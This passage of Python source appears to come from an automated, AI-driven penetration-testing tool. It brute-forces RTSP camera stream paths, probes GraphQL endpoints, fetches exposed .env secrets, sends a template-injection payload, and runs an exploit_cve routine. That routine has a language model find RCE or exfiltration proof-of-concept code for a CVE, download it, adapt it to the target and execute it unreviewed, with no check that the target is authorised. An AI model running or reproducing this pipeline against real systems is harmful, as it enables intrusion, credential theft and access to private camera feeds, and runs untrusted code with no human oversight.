            output.print(f"  [ERROR] An unexpected error occurred during RTSP check on port {port}: {e}")

async def perform_rtsp_attack(target, output, report, session_cookies=None):
    output.print("\n[+] Starting RTSP Scan and Brute Force...")
    domain = get_domain(normalize_target(target))
    rtsp_ports = [554, 8554, 5554, 8080, 80, 88, 81, 555, 7070, 10554]
    
    common_paths = [
        "/live", "/stream", "/stream1", "/cam1/mpeg4", "/onvif1", "/live/ch00_0", "/axis-media/media.amp",
        "/stream.sdp", "/live.sdp", "/video.sdp", "/media.sdp", "/ch0_0.sdp", "/onvif/device_service",
        "/onvif/media_service", "/onvif-http/snapshot", "/video", "/mpeg4", "/h264", "/av0_0",
        "/cam/realmonitor", "/stream/video.rm", "/live/main", "/live/sub", "/stream/main", "/stream/sub",
        "/video.mp4", "/stream.flv", "/live/ch1", "/live/ch2", "/stream/ch1", "/stream/ch2",
        "/channel1", "/channel2", "/media/video1", "/media/video2", "/api/video", "/api/stream",
        "/rtsp/live", "/rtsp/stream", "/1", "/2", "/3", "/4", "/5", "/6", "/7", "/8", "/9", "/10",
        "/cam1/h264", "/cam1/video.h264", "/h264/media.h264", "/mpeg4/media.amp", "/live/h264",
        "/live/mpeg4", "/stream/h264", "/stream/mpeg4", "/video.h264", "/video.mpeg4",
        "/ch01_0.sdp", "/ch01_1.sdp", "/ch02_0.sdp", "/ch02_1.sdp", "/ch03_0.sdp", "/ch03_1.sdp",
        "/media.amp?stream=1", "/video.cgi", "/mjpg/video.mjpg", "/stream/video.mjpeg",
        "/live/ch0", "/video/mjpg.cgi", "/video.mjpg", "/mjpeg.cgi", "/mjpeg",
        "/video/video.mjpeg", "/video/video.cgi", "/video/video.mp4", "/video/video.h264",
        "/video/video.flv", "/video/video.asf", "/video/video.wmv", "/video/video.avi", "/video/video.mov",
        "/stream.h264", "/stream.mpeg4", "/stream.ts", "/stream.3gp", "/stream.mov", "/stream.mjpeg",
        "/live/ch01_0", "/live/ch01_1", "/live/ch02_0", "/live/ch02_1", "/live/ch03_0", "/live/ch03_1",
        "/channel/1", "/channel/2", "/cam/1", "/cam/2", "/media/1", "/media/2", "/stream/1", "/stream/2",
        "/live/1", "/live/2", "/onvif/1", "/onvif/2", "/rtsp/1", "/rtsp/2",
        "/ufirststream", "/usecondstream", "/uthirdstream", "/videoinput_1/h264_1", "/videoinput_1/mjpeg_1",
        "/live1.sdp", "/live2.sdp", "/Streaming/Channels/1", "/Streaming/Channels/101",
        "/media/videoMain", "/media/videoSub",
        # Massive expansion
        *[f"/live/ch{i}" for i in range(3, 50)],
        *[f"/stream/ch{i}" for i in range(3, 50)],
        *[f"/channel/{i}" for i in range(3, 50)],
        *[f"/cam/{i}" for i in range(3, 50)],
        *[f"/media/{i}" for i in range(3, 50)],
        *[f"/stream/{i}" for i in range(3, 50)],
        *[f"/live/{i}" for i in range(3, 50)],
        *[f"/onvif/{i}" for i in range(3, 50)],
        *[f"/rtsp/{i}" for i in range(3, 50)],
        *[f"/{i}" for i in range(11, 50)],
        # Different formats and naming conventions
        *[f"/video.{ext}" for ext in ["3gp", "asf", "avi", "mkv", "mov", "mp4", "mpeg", "mpg", "rm", "swf", "vob", "wmv"]],
        *[f"/stream.{ext}" for ext in ["3gp", "asf", "avi", "mkv", "mov", "mp4", "mpeg", "mpg", "rm", "swf", "vob", "wmv"]],
        *[f"/live.{ext}" for ext in ["3gp", "asf", "avi", "mkv", "mov", "mp4", "mpeg", "mpg", "rm", "swf", "vob", "wmv"]],
        *[f"/channel{i}/stream{j}" for i in range(1, 5) for j in range(1, 5)],
        *[f"/cam{i}/stream{j}" for i in range(1, 5) for j in range(1, 5)],
        *[f"/live{i}_stream{j}" for i in range(1, 5) for j in range(1, 5)],
        *[f"/stream/profile{i}" for i in range(1, 5)],
        *[f"/video/profile{i}" for i in range(1, 5)],
        *[f"/ch{i:02d}/0" for i in range(50)],
        *[f"/ch{i:02d}/1" for i in range(50)],
        # ONVIF specific
        "/onvif/device_service", "/onvif/media_service", "/onvif/ptz_service", "/onvif/imaging_service",
        "/onvif/events_service", "/onvif/analytics_service", "/onvif/video_analytics_service",
        "/onvif/recording_service", "/onvif/replay_service", "/onvif/search_service",
        # More...
        "/Streaming/channels/1/http", "/Streaming/channels/2/http",
        "/img/video.sav", "/av_stream", "/cam_stream", "/mjpeg_stream",
        "/rtp/media", "/rtsp_tunnel", "/video_feed", "/live_feed",
        "/GetData.cgi", "/GetVideo.cgi", "/GetStream.cgi",
        "/play1.sdp", "/play2.sdp",
        "/media/cam0/video", "/media/cam1/video",
        "/axis-media/media.3gp", "/axis-media/media.asf",
        "/video.mjpg", "/video.mjpg", "/video.mjpg?q=30",
        "/stream.mjpg", "/stream.mjpeg",
        "/live/av0", "/live/av1",
        "/video/live", "/video/stream",
        "/video/v1", "/video/v2",
        "/stream/v1", "/stream/v2",
        "/live/v1", "/live/v2",
        # New additions to ensure 500+ RTSP paths
        # Generic Camera/DVR/NVR Paths
        "/unicast/c1/s1", "/unicast/c2/s1", "/unicast/c3/s1",
        "/mpeg4/ch1/main/av_stream", "/mpeg4/ch2/main/av_stream",
        "/h264/ch1/main/av_stream", "/h264/ch2/main/av_stream",
        "/live/ch01_00", "/live/ch01_01", "/live/ch02_00", "/live/ch02_01",
        "/Streaming/Channels/101", "/Streaming/Channels/102", "/Streaming/Channels/103",
        "/axis-media/media.amp?videocodec=h264", "/axis-media/media.amp?videocodec=mpeg4",
        "/cam/realmonitor?channel=1&subtype=0", "/cam/realmonitor?channel=1&subtype=1",
        "/ch01/0", "/ch02/0", "/ch03/0", # Simplified channel
        "/ch01.sdp", "/ch02.sdp", "/ch03.sdp",
        "/live/ch0_0.sdp", "/live/ch1_0.sdp", "/live/ch2_0.sdp",
        "/mainstream", "/substream", "/extra", "/record", "/playback",
        "/play/live.sdp", "/vod/mp4:sample.mp4",
        "/ISAPI/Streaming/channels/101/rtp",
        "/onvif/profile1/media.sbn", # ONVIF related (specific to Axis)
        "/onvif/live/1", "/onvif/live/2",
        "/media/video/1", "/media/video/2",
        "/PSIA/Streaming/channels/1/rtp",  # PSIA standard
        "/PSIA/Streaming/channels/2/rtp",
        
        # Manufacturer-specific common paths
        "/h264/ch1/sub/av_stream", # Hikvision
        "/Streaming/Channels/101/h264", # Dahua
        "/VideoInput/channels/1/stream/0", # Uniview
        "/live/0/0/0/0", "/live/1/0/0/0", # Samsung
        "/live/0/0/0", "/live/1/0/0", # Bosch
        "/cam/realmonitor?channel=1&subtype=0&unicast=true&proto=rtp", # Dahua variations
        
        # More generated paths
        *[f"/live/{i}/0" for i in range(100)],
        *[f"/stream/{i}/0" for i in range(100)],
        *[f"/channel{i}/0" for i in range(100)],
        *[f"/cam{i}/feed" for i in range(100)],
        *[f"/media/{i}/stream" for i in range(100)],
        *[f"/videoinput_{i}/h264_1" for i in range(100)],
        
        # Uncommon ports with common paths (already covered by rtsp_ports iteration, but adding specific path examples)
        *[f"/{p}/live" for p in [81, 8080, 8443]],
        *[f"/{p}/stream" for p in [81, 8080, 8443]],
        
        # Different file extensions (not just sdp)
        *[f"/video.mkv", "/video.ts", "/video.avi", "/video.flv", "/video.wmv"],
        *[f"/stream.mkv", "/stream.ts", "/stream.avi", "/stream.flv", "/stream.wmv"],
        *[f"/live.mkv", "/live.ts", "/live.avi", "/live.flv", "/live.wmv"],
        
        # More specific common paths
        "/user/rtsp", "/admin/rtsp", "/manager/rtsp",
        "/system/video", "/security/channel1", "/cctv/stream",
        "/IPC/realtime", "/NVR/stream",
        "/cam/ch1", "/cam/ch2", "/cam/ch3",
        "/stream/0", "/stream/1", "/stream/2",
        "/0/live", "/1/live", "/2/live",
        "/ch/1", "/ch/2", "/ch/3",
        "/ch01/0/main", "/ch01/0/sub",
        "/channel/1/videostream",
        "/Streaming/Channels/1/Picture", "/Streaming/Channels/1/Event",
        
        # Obfuscated / bypass attempts (less common for RTSP but good for fuzzing)
        "/%2e%2e/%2e%2e/live", # URL encoded traversal
        "/%00live", # Null byte
        "/live%20", # Trailing space
        "/Live", "/STREAM", "/Video", # Case variations
        "/live.sdp?", "/stream.sdp//", # Query/trailing slashes
        
        # Over-the-top paths to push count
        *[f"/ch/{val}/stream" for val in range(1, 100)]
    ]
    output.print(f"  [*] Attempting RTSP scan on {domain} with ports: {rtsp_ports}...")

    for port in rtsp_ports:
        try:
            reader, writer = await asyncio.open_connection(domain, port)
            writer.close()
            await writer.wait_closed()

            output.print(f"  [INFO] Port {port} is open. Sending RTSP OPTIONS request...")
            request_line = f"OPTIONS rtsp://{domain}:{port} RTSP/1.0\r\nCSeq: 1\r\n\r\n"
            reader_opt, writer_opt = await asyncio.open_connection(domain, port)
            writer_opt.write(request_line.encode())
            await writer_opt.drain()
            response = await asyncio.wait_for(reader_opt.read(1024), timeout=3)
            writer_opt.close()
            await writer_opt.wait_closed()

            if "RTSP/1.0 200 OK" in response.decode():
                methods = re.search(r"Public:\s*([^\r\n]+)", response.decode())
                methods_str = methods.group(1) if methods else "N/A"
                output.print(f"  [HIGH] RTSP server found at rtsp://{domain}:{port}. Supported methods: {methods_str}")
                report.add_finding(
                    type="RTSP Service Detected", 
                    severity="Medium", 
                    url=f"rtsp://{domain}:{port}", 
                    parameter="N/A", 
                    payload="N/A",
                    description=f"An RTSP server is running on port {port}. Supported methods: {methods_str}. This could expose video streams.",
                    remediation="Ensure the RTSP stream requires authentication and is properly firewalled if not intended for public access.",
                    response_snippet=f"RTSP OPTIONS Response:\n{response.decode()}"
                )

                for path in common_paths:
                    full_path = f"rtsp://{domain}:{port}{path}"
                    req = f"DESCRIBE {full_path} RTSP/1.0\r\nCSeq: 2\r\n\r\n"
                    reader_brute, writer_brute = await asyncio.open_connection(domain, port)
                    writer_brute.write(req.encode())
                    await writer_brute.drain()
                    res_brute = await asyncio.wait_for(reader_brute.read(1024), timeout=3)
                    writer_brute.close()
                    await writer_brute.wait_closed()
                    if "RTSP/1.0 200 OK" in res_brute.decode() and "Content-Type: application/sdp" in res_brute.decode():
                        output.print(f"    [CRITICAL] Found valid RTSP stream path: {full_path}")
                        report.add_finding(
                            type="RTSP Stream Path Found", 
                            severity="High", 
                            url=full_path, 
                            parameter="N/A", 
                            payload="N/A",
                            description=f"A valid and likely unprotected RTSP stream was found at {full_path}.",
                            remediation="Protect RTSP streams with strong credentials.",
                            response_snippet=f"RTSP DESCRIBE Response:\n{res_brute.decode()}"
                        )
        except asyncio.TimeoutError:
            output.print(f"  [INFO] RTSP check on port {port} timed out.")
        except ConnectionRefusedError:
            output.print(f"  [INFO] Connection to RTSP port {port} refused.")
        except Exception as e:
            output.print(f"  [ERROR] An unexpected error occurred during RTSP check on port {port}: {e}")
            
async def perform_graphql_injection_attack(target, output, report, session_cookies=None):
    output.print("\n[+] Starting GraphQL Injection Scan...")
    target_url = normalize_target(target)
    
    graphql_endpoints = ["/graphql", "/api/graphql", "/v1/graphql"]
    
    for endpoint in graphql_endpoints:
        url = urljoin(target_url, endpoint)
        output.print(f"  [*] Testing GraphQL endpoint: {url}")
        
        # Replace _send_async_http_request with requests.request
        try:
            res = requests.request('POST', url, data=json.dumps({"query": "{ __typename }"}), headers={'Content-Type': 'application/json'}, cookies=session_cookies, timeout=10, verify=True)
            response_text = res.text
            status_code = res.status_code
        except requests.exceptions.RequestException as e:
            output.print(f"  [ERROR] Request failed for {url}: {e}")
            continue

        if status_code == 200 and "__typename" in response_text:
            output.print(f"  [INFO] GraphQL endpoint detected at: {url}")
            
            introspection_query = "query IntrospectionQuery{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}} "
            
            # Replace _send_async_http_request with requests.request
            try:
                res_intro = requests.request('POST', url, data=json.dumps({"query": introspection_query}), headers={'Content-Type': 'application/json'}, cookies=session_cookies, timeout=10, verify=True)
                response_intro_text = res_intro.text
                status_intro_code = res_intro.status_code
            except requests.exceptions.RequestException as e:
                output.print(f"  [ERROR] Request failed for introspection query at {url}: {e}")
                response_intro_text = ""
                status_intro_code = 0

            if status_intro_code == 200 and "__schema" in response_intro_text:
                output.print(f"  [HIGH] GraphQL Introspection Query enabled, schema disclosed at {url}")
                report.add_finding(
                    type="GraphQL Schema Disclosure (Introspection)", 
                    severity="High", 
                    url=url, 
                    parameter="query", 
                    payload="Introspection Query", 
                    description="The GraphQL endpoint allows introspection queries, disclosing the full API schema.", 
                    remediation="Disable GraphQL introspection in production environments.", 
                    response_snippet=response_intro_text[:500]
                )
            else:
                output.print(f"  [INFO] GraphQL Introspection Query appears disabled or failed at {url}.")

            output.print(f"  [*] Testing for GraphQL Batching vulnerabilities (conceptual) at {url}...")
            batch_query = json.dumps([{"query": "{ user(id: 1) { username } }"}, {"query": "{ user(id: 2) { username } }"}])
            
            # Replace _send_async_http_request with requests.request
            try:
                res_batch = requests.request('POST', url, data=batch_query, headers={'Content-Type': 'application/json'}, cookies=session_cookies, timeout=10, verify=True)
                response_batch_text = res_batch.text
                status_batch_code = res_batch.status_code
            except requests.exceptions.RequestException as e:
                output.print(f"  [ERROR] Request failed for batching query at {url}: {e}")
                response_batch_text = ""
                status_batch_code = 0

            if status_batch_code == 200 and "username" in response_batch_text:
                output.print(f"  [MEDIUM] Potential GraphQL Batching vulnerability detected at {url}.")
                report.add_finding(
                    type="GraphQL Batching Vulnerability", 
                    severity="Medium", 
                    url=url, 
                    parameter="query", 
                    payload=batch_query, 
                    description="The GraphQL endpoint allows batching multiple queries, which could be abused to bypass rate limits or access unauthorized data.", 
                    remediation="Implement proper authorization checks for each query within a batch and consider rate limiting.", 
                    response_snippet=response_batch_text[:500]
                )
            
            return
    
    output.print("  [INFO] GraphQL Injection scan completed.")

async def perform_react2shell_attack(target, output, report, session_cookies=None):
    output.print("\n[+] Starting React2Shell Scan...")
    target_url = normalize_target(target)
    
    env_paths = ["/.env", "/.env.local", "/.env.development", "/.env.production"]
    for path in env_paths:
        url = urljoin(target_url, path)
        try:
            res = requests.get(url, cookies=session_cookies, timeout=10, verify=True)
            response_text = res.text
            status_code = res.status_code
        except requests.exceptions.RequestException as e:
            output.print(f"  [ERROR] Request failed for {url}: {e}")
            continue

        if status_code == 200 and ("API_KEY" in response_text or "DB_PASSWORD" in response_text or "SECRET_KEY" in response_text):
            output.print(f"  [CRITICAL] Exposed .env file found at: {url}")
            report.add_finding(
                type="Exposed Environment File", 
                severity="Critical", 
                url=url, 
                parameter="N/A", 
                payload="N/A", 
                description="A sensitive environment file (.env) was found, potentially exposing credentials, API keys, and other secrets.", 
                remediation="Configure the web server to deny access to .env files. These files should never be in a web-accessible directory.",
                response_snippet=f"Exposed URL: {url}\nContent snippet: {response_text[:200]}..."
            )
            return

    output.print("  [*] Checking for exposed source maps...")
    js_files = []
    try:
        res = requests.get(target_url, cookies=session_cookies, timeout=10, verify=True)
        response_text = res.text
    except requests.exceptions.RequestException as e:
        output.print(f"  [ERROR] Request failed for {target_url}: {e}")
        response_text = ""

    if res:
        soup = BeautifulSoup(response_text, 'html.parser')
        for script in soup.find_all('script', src=True):
            if script['src'].endswith('.js'):
                js_files.append(urljoin(target_url, script['src']))
    
    for js_file in js_files:
        map_file = f"{js_file}.map"
        try:
            res_map = requests.get(map_file, cookies=session_cookies, timeout=10, verify=True)
            response_map_text = res_map.text
            status_map_code = res_map.status_code
        except requests.exceptions.RequestException as e:
            output.print(f"  [ERROR] Request failed for {map_file}: {e}")
            continue

        if status_map_code == 200 and "sourcesContent" in response_map_text:
            output.print(f"  [HIGH] Exposed JavaScript Source Map found at: {map_file}")
            report.add_finding(
                type="Exposed JavaScript Source Map", 
                severity="High", 
                url=map_file, 
                parameter="N/A", 
                payload="N/A", 
                description="An exposed JavaScript source map can reveal original source code, potentially exposing sensitive logic or credentials.", 
                remediation="Ensure source maps are not publicly accessible in production environments.",
                response_snippet=f"Exposed Source Map URL: {map_file}\nContent snippet: {response_map_text[:200]}"
            )

    output.print("  [*] Checking for Server-Side Rendering (SSR) vulnerabilities (conceptual)...")
    ssr_payload = "{{7*7}}"
    test_url = f"{target_url}?name={quote(ssr_payload)}"
    try:
        res_ssr = requests.get(test_url, cookies=session_cookies, timeout=10, verify=True)
        response_ssr_text = res_ssr.text
        status_ssr_code = res_ssr.status_code
    except requests.exceptions.RequestException as e:
        output.print(f"  [ERROR] Request failed for {test_url}: {e}")
        response_ssr_text = ""
        status_ssr_code = 0

    if status_ssr_code == 200 and "49" in response_ssr_text:
        output.print(f"  [CRITICAL] Potential SSR Injection found with payload: {ssr_payload}")
        report.add_finding(
            type="Server-Side Rendering (SSR) Injection", 
            severity="Critical", 
            url=test_url, 
            parameter="name", 
            payload=ssr_payload,
            description="The application appears vulnerable to SSR injection, which could lead to RCE or information disclosure.",
            remediation="Ensure all user input rendered server-side is properly sanitized and escaped.",
            response_snippet=f"Vulnerable URL: {test_url}\nPayload: {ssr_payload}\nResponse snippet: {response_ssr_text[:200]}"
        )
        return

    output.print("  [INFO] React2Shell scan completed.")

# =================================================================================
# CVE Exploitation Module (NEW)
# =================================================================================

async def exploit_cve(cve_id, target_url, ai_model_instance, log_func, report_generator, ai_name):
    """
    Attempts to exploit a given CVE using AI-driven web search, code adaptation, and execution.
    """
    log_func(f"[CVE Exploitation] Starting exploitation attempt for {cve_id} on {target_url}")
    exploitation_results = []
    temp_file = None # Initialize temp_file outside try block




    try:
        # Step 1: AI-driven Web Search for PoC
        search_prompt = f"Find Python or shell script Proof-of-Concept (PoC) exploit code for {cve_id}. Provide direct links to reputable sources like GitHub, Exploit-DB, or security research blogs. Prioritize RCE or data exfiltration exploits. If no direct links, provide the code directly. Return ONLY the links or code. Do not add any explanations or extra text."
        log_func(f"[CVE Exploitation] AI ({ai_name}) searching for PoC for {cve_id}...")
        
        # Call _get_ai_response synchronously for now, as FullAIModeRunner's _get_ai_response is not async
        ai_search_response = ai_model_instance._get_ai_response(ai_name, search_prompt, []) 

        if not ai_search_response:
            log_func(f"[CVE Exploitation] AI ({ai_name}) failed to find PoC for {cve_id} or response was empty.")
            return exploitation_results

        exploit_code = None
        # Attempt to extract URLs first
        urls = re.findall(r'https?://[^\s<>"]+|www\.[^\s<>"]+', ai_search_response)
        
        for url in urls:
            log_func(f"[CVE Exploitation] Attempting to fetch PoC from: {url}")
            try:
                response = requests.get(url, timeout=10)
                # Check for common code file extensions or raw content indicators
                if response.status_code == 200 and any(ext in url for ext in ['.py', '.sh', '.txt', 'raw', 'pastebin']):
                    exploit_code = response.text
                    log_func(f"[CVE Exploitation] Successfully fetched PoC from {url}")
                    break
            except requests.exceptions.RequestException as e:
                log_func(f"[CVE Exploitation] Failed to fetch PoC from {url}: {e}")
        
        if not exploit_code and ("python" in ai_search_response.lower() or "shell" in ai_search_response.lower() or "def " in ai_search_response.lower() or "#!" in ai_search_response.lower()):
            # If no URLs worked, assume AI provided code directly
            exploit_code = ai_search_response
            log_func(f"[CVE Exploitation] Assuming AI provided exploit code directly.")

        if not exploit_code:
            log_func(f"[CVE Exploitation] No usable exploit code found or provided by AI for {cve_id}.")
            return exploitation_results

        # Step 2: AI-driven Code Adaptation
        adaptation_prompt = f"""The following exploit code is for {cve_id}.
Target URL: {target_url}
Analyze the code and adapt it to work against the target URL.
Specifically, look for variables like 'target_url', 'host', 'ip', 'port' and replace them with '{target_url}' or relevant parts of it.
If it's a Python script, ensure it's executable and self-contained. If it's a shell script, ensure it's ready to run.
Return ONLY the modified, ready-to-execute code. Do not add any explanations or extra text.
---
{exploit_code}
---"""
        log_func(f"[CVE Exploitation] AI ({ai_name}) adapting PoC code for {cve_id}...")
        ai_adapted_code = ai_model_instance._get_ai_response(ai_name, adaptation_prompt, [])

        if not ai_adapted_code:
            log_func(f"[CVE Exploitation] AI ({ai_name}) failed to adapt PoC code for {cve_id}.")
            return exploitation_results
        
        adapted_code = ai_adapted_code.strip()
        if not adapted_code:
            log_func(f"[CVE Exploitation] Adapted code is empty for {cve_id}.")
            return exploitation_results

        # Determine file extension based on adapted code content
        file_extension = ".py"
        if "import" in adapted_code or "def " in adapted_code or "class " in adapted_code:
            file_extension = ".py"
        elif adapted_code.startswith("#!") or "bash" in adapted_code or "sh" in adapted_code:
            file_extension = ".sh"
        
        # Step 3: Execute Adapted Code
        with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix=file_extension) as tmp:
            tmp.write(adapted_code)
            temp_file = tmp.name
        
        os.chmod(temp_file, 0o755) # Make it executable

        log_func(f"[CVE Exploitation] Executing adapted PoC code for {cve_id} from {temp_file}...")
        
        command = [temp_file]
        if file_extension == ".py":
            command = ["python3", temp_file]
        elif file_extension == ".sh":
            command = ["bash", temp_file]

        process = subprocess.run(
            command,
            capture_output=True,
            text=True,
            encoding='utf-8',
            errors='ignore',
            timeout=60 # 60 seconds timeout for exploit execution
        )
        exploit_output = f"--- STDOUT ---\n{process.stdout}\n--- STDERR ---\n{process.stderr}"
        log_func(f"[CVE Exploitation] PoC execution output:\n{exploit_output}")

        # Step 4: AI-driven Verification
        verification_prompt = f"""Analyze the following output from an exploit attempt for {cve_id} against {target_url}.
Determine if the exploitation was successful, specifically looking for evidence of Remote Code Execution (RCE) like 'uid=', 'whoami' output, or sensitive data exfiltration.
If successful, clearly state 'SUCCESS' and provide the evidence. If not, state 'FAILURE'.
---
{exploit_output}
---"""
        log_func(f"[CVE Exploitation] AI ({ai_name}) verifying PoC execution for {cve_id}...")
        ai_verification_response = ai_model_instance._get_ai_response(ai_name, verification_prompt, [])

        if ai_verification_response and "SUCCESS" in ai_verification_response.upper():
            log_func(f"[CVE Exploitation] AI ({ai_name}) verified SUCCESS for {cve_id}!")
            exploitation_results.append({
                "type": f"CVE Exploitation ({cve_id})",
                "severity": "Critical",
                "payload": adapted_code,
                "target_url": target_url,
                "exploit_output": exploit_output,
                "ai_verification": ai_verification_response,
                "poc_code": adapted_code, # Store the adapted code as PoC
                "extracted_data": ai_verification_response # AI's verification might contain extracted data
            })
            report_generator.add_finding(exploitation_results[-1])
        else:
            log_func(f"[CVE Exploitation] AI ({ai_name}) verified FAILURE for {cve_id}.")
            exploitation_results.append({
                "type": f"CVE Exploitation Attempt ({cve_id})",
                "severity": "Informational",
                "payload": adapted_code,
                "target_url": target_url,
                "exploit_output": exploit_output,
                "ai_verification": ai_verification_response,
                "poc_code": adapted_code,
                "status": "Failed"
            })
            report_generator.add_finding(exploitation_results[-1])

    except subprocess.TimeoutExpired:
        log_func(f"[CVE Exploitation] PoC execution for {cve_id} timed out after 60 seconds.")
        exploitation_results.append({
            "type": f"CVE Exploitation Attempt ({cve_id})",
            "severity": "Informational",
            "payload": adapted_code if 'adapted_code' in locals() else "N/A",
            "target_url": target_url,
            "exploit_output": "Execution timed out.",
            "status": "Timed Out"
        })
        report_generator.add_finding(exploitation_results[-1])
    except Exception as e:
        log_func(f"[CVE Exploitation] An error occurred during CVE exploitation for {cve_id}: {e}")
        exploitation_results.append({
            "type": f"CVE Exploitation Attempt ({cve_id})",
            "severity": "Informational",
            "payload": adapted_code if 'adapted_code' in locals() else "N/A",
            "target_url": target_url,
            "exploit_output": f"Error: {e}",
            "status": "Error"
        })
        report_generator.add_finding(exploitation_results[-1])
    finally:
        if temp_file and os.path.exists(temp_file):
            os.remove(temp_file)
            log_func(f"[CVE Exploitation] Removed temporary exploit file: {temp_file}")

    return exploitation_results

# =================================================================================
# 1. Configuration and Setup
# =================================================================================

class FullAIModeRunner:
    def __init__(self, target, config_path='config.ini'):
        self.target = self._normalize_target(target)
        self.domain = self._get_domain(self.target)
        self.config_path = config_path
        self.session_id = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.output_dir = f"scan_{self._sanitize_filename(self.domain)}_{self.session_id}"
        self.report_file = os.path.join(self.output_dir, "full_ai_pentest_report.txt")
        self.report_generator = Report() # Initialize Report class
        
        self.gemini_api_key = None
        self.claude_api_key = None
        self.gemini_model = None
        self.claude_model = None

        self.gemini_failures = 0
        self.claude_failures = 0
        self.max_failures = 5

        # Ensure the output directory exists before any logging attempts.
        os.makedirs(self.output_dir, exist_ok=True)

    def _normalize_target(self, target):
        if not target.startswith(('http://', 'https://')):
            return f"http://{target}"
        return target

    def _get_domain(self, target):
        from urllib.parse import urlparse
        return urlparse(target).netloc.split(':')[0]

    def _sanitize_filename(self, filename):
        return "".join([c for c in filename if c.isalpha() or c.isdigit() or c in ('_', '-')]).rstrip()

    def _log(self, message):
        """Appends a message to the report file and prints it to the console."""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_message = f"[{timestamp}] {message}"
        print(log_message)
        with open(self.report_file, 'a', encoding='utf-8') as f:
            f.write(log_message + '\n')

    def _setup(self):
        """Initializes directories, loads configs, and sets up AI models."""
        self._log(f"Output directory created at: {self.output_dir}")
        self._log(f"Report file will be saved to: {self.report_file}")

        config = configparser.ConfigParser()
        if not os.path.exists(self.config_path):
            self._log(f"[ERROR] Config file not found at '{self.config_path}'. Cannot proceed.")
            return False
        
        config.read(self.config_path)
        self.gemini_api_key = config.get('GEMINI', 'api_key', fallback=None)
        self.claude_api_key = config.get('CLAUDE', 'api_key', fallback=None)

        if not self.gemini_api_key and not self.claude_api_key:
            self._log("[ERROR] No AI API keys found in config.ini. Full AI mode requires at least one key.")
            return False

        if self.gemini_api_key:
            try:
                google.genai.configure(api_key=self.gemini_api_key)
                self.gemini_model = genai.GenerativeModel('gemini-1.5-flash')
                self._log("[INFO] Gemini API configured successfully.")
            except Exception as e:
                self._log(f"[ERROR] Failed to configure Gemini API: {e}")
                self.gemini_model = None
        
        if self.claude_api_key:
            try:
                self.claude_model = anthropic.Anthropic(api_key=self.claude_api_key)
                self._log("[INFO] Claude API configured successfully.")
            except Exception as e:
                self._log(f"[ERROR] Failed to configure Claude API: {e}")
                self.claude_model = None

        if not self.gemini_model and not self.claude_model:
            self._log("[ERROR] All AI models failed to initialize. Aborting.")
            return False
            
        return True

    def _sync_exploit_cve(self, cve_id, target_url, ai_name):
        """
        Synchronous wrapper to call the async exploit_cve function.
        Manages its own asyncio event loop to avoid conflicts with existing synchronous code.
        """
        self._log(f"[CVE Exploitation] Attempting to run exploit_cve for {cve_id} synchronously.")
        try:
            # Get or create a new event loop for this thread
            try:
                loop = asyncio.get_event_loop()
            except RuntimeError:
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
            
            # Run the async exploit_cve function
            exploitation_results = loop.run_until_complete(
                exploit_cve(
                    cve_id=cve_id,
                    target_url=target_url,
                    ai_model_instance=self, # Pass self to access _get_ai_response
                    log_func=self._log,
                    report_generator=self.report_generator,
                    ai_name=ai_name
                )
            )
            self._log(f"[CVE Exploitation] Finished running exploit_cve for {cve_id}.")
            return exploitation_results
        except Exception as e:
            self._log(f"[CRITICAL-ERROR] Synchronous CVE exploitation wrapper failed for {cve_id}: {e}")
            return []

    def _sync_perform_http_smuggling_attack(self, target_url, headers=None, cookies=None, timeout=15):
        """
        Synchronous wrapper to call the async perform_http_smuggling_attack function.
        Manages its own asyncio event loop to avoid conflicts with existing synchronous code.
        """
        self._log(f"[HTTP Smuggling] Attempting to run perform_http_smuggling_attack for {target_url} synchronously.")
        try:
            # Get or create a new event loop for this thread
            try:
                loop = asyncio.get_event_loop()
            except RuntimeError:
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
            
            # Run the async perform_http_smuggling_attack function
            smuggling_results = loop.run_until_complete(
                perform_http_smuggling_attack(
                    target_url=target_url,
                    headers=headers,
                    cookies=cookies,
                    timeout=timeout
                )
            )
            self._log(f"[HTTP Smuggling] Finished running perform_http_smuggling_attack for {target_url}.")
            return smuggling_results
        except Exception as e:
            self._log(f"[CRITICAL-ERROR] Synchronous HTTP Smuggling wrapper failed for {target_url}: {e}")
            return []

# =================================================================================
# 2. Scanning and Information Gathering
# =================================================================================

    def _run_command(self, command, log_file_name):
        """Executes a shell command, logs its output, and returns the output."""
        log_file_path = os.path.join(self.output_dir, log_file_name)
        self._log(f"Executing command: {' '.join(command)}")
        try:
            process = subprocess.run(
                command,
                capture_output=True,
                text=True,
                encoding='utf-8',
                errors='ignore'
            )
            output = f"--- STDOUT ---\n{process.stdout}\n--- STDERR ---\n{process.stderr}"
            with open(log_file_path, 'w', encoding='utf-8') as f:
                f.write(output)
            self._log(f"Command finished. Output saved to {log_file_path}")
            return process.stdout
        except FileNotFoundError:
            error_msg = f"[ERROR] Command '{command[0]}' not found. Please ensure it is installed and in your PATH."
            self._log(error_msg)
            with open(log_file_path, 'w', encoding='utf-8') as f:
                f.write(error_msg)
            return ""
        except Exception as e:
            error_msg = f"[ERROR] An unexpected error occurred while running command '{' '.join(command)}': {e}"
            self._log(error_msg)
            with open(log_file_path, 'w', encoding='utf-8') as f:
                f.write(error_msg)
            return ""

    def _run_scans(self):
        """Runs all external scanning tools."""
        self._log("--- Starting Phase 1: Information Gathering ---")
        scan_results = {}

        # Nmap Scan
        self._log("Running Nmap scan...")
        nmap_command = ["nmap", "-sV", "-A", "-T4", "--script", "vuln,discovery", self.domain]
        scan_results['nmap'] = self._run_command(nmap_command, "nmap_scan.txt")

        # Nikto Scan
        self._log("Running Nikto scan...")
        nikto_command = ["nikto", "-h", self.target]
        scan_results['nikto'] = self._run_command(nikto_command, "nikto_scan.txt")

        # Nuclei Scan
        self._log("Running Nuclei scan...")
